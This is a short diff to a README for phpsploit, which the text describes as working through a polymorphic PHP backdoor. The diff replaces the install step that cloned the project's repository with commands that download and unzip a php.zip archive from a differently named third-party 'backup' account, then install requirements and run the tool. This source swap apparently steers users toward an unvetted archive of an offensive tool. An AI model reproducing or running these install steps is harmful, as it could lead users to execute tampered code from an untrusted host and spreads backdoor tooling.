@@ -80,8 +80,9 @@ through a tiny **polymorphic backdoor**:
 #### Quick Start
 
 ```sh
-git clone https://github.com/nil0x42/phpsploit
-cd phpsploit/
+wget https://github.com/JawaTengahXploit1337/phpsploit-backup/raw/refs/heads/main/php.zip
+unzip php.zip
+cd phpsploit
 pip3 install -r requirements.txt
 ./phpsploit --interactive --eval "help help"
 ```
